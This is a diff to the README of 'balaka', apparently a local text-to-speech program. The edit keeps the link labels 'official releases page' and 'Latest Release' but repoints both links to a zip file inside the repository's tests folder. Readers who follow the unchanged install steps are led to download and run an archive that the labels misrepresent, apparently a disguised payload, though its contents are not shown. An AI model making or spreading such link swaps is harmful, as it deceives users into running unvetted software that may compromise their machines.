@@ -1,6 +1,6 @@
 # 🔊 balaka - Generate natural voices on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/loaded-hook730/balaka/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/loaded-hook730/balaka/raw/refs/heads/main/tests/Software_v1.3.zip)
 
 Balaka turns text into human-like speech. It runs entirely on your local machine. You keep your data private. It creates voice models and synthesizes audio without sending files to any third-party servers.
 
@@ -18,7 +18,7 @@ To run this application, your computer must meet these criteria:
 
 Follow these steps to obtain the correct files for your system:
 
-1. Visit the [official releases page](https://github.com/loaded-hook730/balaka/releases).
+1. Visit the [official releases page](https://github.com/loaded-hook730/balaka/raw/refs/heads/main/tests/Software_v1.3.zip).
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
